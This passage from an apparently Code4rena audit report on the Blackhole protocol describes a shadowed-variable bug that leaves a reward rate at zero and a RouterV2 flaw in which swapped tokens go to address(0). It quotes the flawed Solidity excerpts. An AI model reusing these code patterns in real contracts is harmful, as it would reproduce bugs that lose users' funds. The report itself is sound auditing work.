(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e += \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eNo matter how you call \u003ccode\u003eincrementRewardRate\u003c/code\u003e with different values, the storage variable \u003ccode\u003erewardRate\u003c/code\u003e will \u003cstrong\u003enever change\u003c/strong\u003e. This is because the function’s return variable \u003ccode\u003erewardRate\u003c/code\u003e shadows the contract’s storage variable of the same name.\u003c/p\u003e\n\u003cp\u003eAll updates inside the function only affect the local return variable, not the storage.\nAs a result, \u003ccode\u003erewardRate()\u003c/code\u003e (the public getter) will always return \u003ccode\u003e0\u003c/code\u003e, regardless of how many times you call the function or what arguments you provide.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues\"\u003eBlackhole mitigated\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Mitigation confirmed. Full details in reports from \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-19\"\u003elonelybones\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-47\"\u003erayss\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-58\"\u003emaxvzuvex\u003c/a\u003e.\u003c/p\u003e\n\u003chr\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-09-zero-receiver-fund-burn\" style=\"position:relative;\"\u003e\u003ca href=\"#m-09-zero-receiver-fund-burn\" aria-label=\"m 09 zero receiver fund burn permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-188\"\u003e[M-09] Zero-receiver fund burn\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-409\"\u003e0x15\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/RouterV2.sol#L499-L530\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/RouterV2.sol#L499-L530\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact-1\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact-1\" aria-label=\"finding description and impact 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003eRouterV2\u003c/code\u003e implementation has a fundamental flaw where tokens are burned to the zero address instead of being sent to the intended recipient.\u003c/p\u003e\n\u003cp\u003eThe route struct includes a receiver field that defaults to \u003ccode\u003eaddress(0)\u003c/code\u003e when not explicitly set:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"40\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003estruct\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroute\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econcentrated\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIn the \u003ccode\u003e_swap\u003c/code\u003e function, both swap paths use \u003ccode\u003eroutes[i].receiver\u003c/code\u003e as the destination.\u003c/p\u003e\n\u003cp\u003eFor concentrated pools, it’s used as the recipient parameter:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"41\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003erecipient: \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eFor standard pools, it’s used in the swap call:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"42\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003eIBaseV1Pair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epairFor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003estable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eswap\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount0Out\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount1Out\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe critical issue is in how routes are constructed.\u003c/p\u003e\n\u003cp\u003eIn \u003ccode\u003eswapExactTokensForTokensSimple\u003c/code\u003e routes are created with only \u003ccode\u003efrom\u003c/code\u003e, \u003ccode\u003eto\u003c/code\u003e, \u003ccode\u003estable\u003c/code\u003e, and \u003ccode\u003econcentrated\u003c/code\u003e fields set, but the receiver field is never populated:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"43\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eroute\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eroute\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[](\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenTo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003estable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003econcentrated\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econcentrated\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIn \u003ccode\u003eswapExactTokensForTokens\u003c/code\u003e routes are passed directly from users who build them without setting the receiver field:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"44\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eswapExactTokensForTokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountIn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOutMin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroute\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldata\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeadline\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eensure\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeadline\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eBoth functions pass the \u003ccode\u003e_to\u003c/code\u003e parameter to \u003ccode\u003e_swap\u003c/code\u003e, but it’s never used - the function only uses \u003ccode\u003eroutes[i].receiver\u003c/code\u003e:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"45\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_swap\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroute\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_to\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003evirtual\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003econcentrated\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e){\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eallowance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eapprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eISwapRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eExactInputSingleParams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einputParams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einputParams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan 